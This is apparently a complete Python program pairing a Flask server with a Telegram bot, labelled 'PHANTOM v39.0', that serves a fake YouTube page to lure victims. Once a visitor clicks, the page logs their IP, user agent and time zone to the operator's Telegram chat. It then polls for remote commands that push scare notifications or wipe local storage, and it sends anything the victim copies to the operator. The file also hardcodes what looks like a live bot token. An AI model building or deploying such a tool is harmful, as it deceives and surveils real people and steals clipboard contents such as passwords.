import asyncio, threading, requests, uuid, json, os, base64, urllib.parse
from flask import Flask, render_template_string, request, jsonify
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] CONFIG ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
ADMIN_ID = 6932598380  # ТВОЙ ID (Илья)
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Хранилища данных
active_commands = {} 
user_modes = {}
victim_data = {}

# --- [2] ТЕМПЛЕЙТ (Скрытый опрос сервера) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body style="margin:0; background:#fff; font-family:sans-serif;" onclick="ignite()">
    <div style="padding:10px; border-bottom:1px solid #eee;"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div style="width:100%; aspect-ratio:16/9; background:#000; position:relative;">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; height:100%; object-fit:cover;">
        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:68px; height:48px; background:rgba(255,0,0,0.9); border-radius:12px;"></div>
    </div>
    <div id="st" style="padding:20px; color:#666;">Загрузка...</div>

<script>
let sid = "{{ sid }}";
let active = false;

async function ignite() {
    if(active) return; active = true;
    document.getElementById('st').innerText = "Соединение с сервером...";

    let d = { 
        sid: sid, 
        ua: navigator.userAgent, 
        res: screen.width+"x"+screen.height,
        loc: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    // Мгновенный лог
    navigator.sendBeacon('/log', btoa(encodeURIComponent(JSON.stringify(d))));

    // Цикл команд
    setInterval(async () => {
        try {
            let r = await fetch('/poll/' + sid);
            let cmd = await r.json();
            if (cmd.type === 'push') {
                if(Notification.permission === 'granted') new Notification("System", {body: cmd.txt});
                else Notification.requestPermission();
            }
            if (cmd.type === 'kill') {
                localStorage.clear();
                location.href = "https://google.com";
            }
        } catch(e) {}
    }, 4000);

    // Перехват буфера
    document.addEventListener('copy', () => {
        let t = window.getSelection().toString();
        fetch('/clip', { method: 'POST', body: JSON.stringify({sid: sid, txt: t}) });
    });

    setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 2000);
}
</script>
</body>
</html>
"""

# --- [3] FLASK BACKEND ---

@app.route('/v/<sid>')
def victim_page(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/log', methods=['POST'])
def logger():
    raw = base64.b64decode(request.get_data()).decode()
    data = json.loads(urllib.parse.unquote(raw))
    sid = data['sid']
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Кнопки для админа (Тебя)
    kb = InlineKeyboardBuilder()
    kb.button(text="🔔 Запросить Push-сообщение", callback_data=f"req_push_{sid}")
    kb.button(text="☣️ САМОЛИКВИДАЦИЯ", callback_data=f"req_kill_{sid}")
    
    report = (
        f"🎯 **ЦЕЛЬ В СЕТИ**\n"
        f"━━━━━━━━━━━━━━\n"
        f"🌐 **IP:** `{ip}`\n"
        f"📱 **ОС:** `{data['ua'][:40]}...`\n"
        f"📍 **Зона:** `{data['loc']}`\n"
        f"━━━━━━━━━━━━━━\n"
        f"Выберите действие для подтверждения:"
    )
    
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": ADMIN_ID, "text": report, "reply_markup": kb.adjust(1).as_markup(), "parse_mode": "Markdown"})
    return "OK"

@app.route('/poll/<sid>')
def poll(sid):
    return jsonify(active_commands.pop(sid, {"type": "none"}))

@app.route('/clip', methods=['POST'])
def clip():
    d = json.loads(request.get_data())
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": ADMIN_ID, "text": f"📋 **БУФЕР ПЕРЕХВАЧЕН:**\n`{d['txt']}`"})
    return "OK"

# --- [4] TELEGRAM BOT ---

@dp.message(Command("start"))
async def st(m: types.Message):
    if m.from_user.id != ADMIN_ID: return
    kb = ReplyKeyboardBuilder().button(text="🧨 Создать ссылку").as_markup(resize_keyboard=True)
    await m.answer("🕶 **PHANTOM v39.0 | MODERATION MODE**", reply_markup=kb)

@dp.message(F.text == "🧨 Создать ссылку")
async def create(m: types.Message):
    if m.from_user.id != ADMIN_ID: return
    await m.answer(f"🔗 **Твоя ссылка:**\n`{BASE_URL}/v/{ADMIN_ID}`")

@dp.callback_query(F.data.startswith("req_"))
async def ask_permission(c: types.CallbackQuery):
    _, type, sid = c.data.split("_")
    kb = InlineKeyboardBuilder()
    kb.button(text="✅ РАЗРЕШИТЬ", callback_data=f"confirm_{type}_{sid}")
    kb.button(text="❌ ОТКЛОНИТЬ", callback_data=f"deny_{sid}")
    
    await c.message.edit_text(f"⚠️ **ПОДТВЕРЖДЕНИЕ**\nВы хотите отправить `{type}` пользователю `{sid}`?", 
                             reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("confirm_"))
async def confirm(c: types.CallbackQuery):
    _, type, sid = c.data.split("_")
    active_commands[sid] = {"type": type, "txt": "Внимание! Обнаружена подозрительная активность."}
    await c.message.edit_text(f"✅ Команда `{type}` успешно отправлена на устройство.")

@dp.callback_query(F.data.startswith("deny_"))
async def deny(c: types.CallbackQuery):
    await c.message.edit_text("❌ Действие отменено.")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
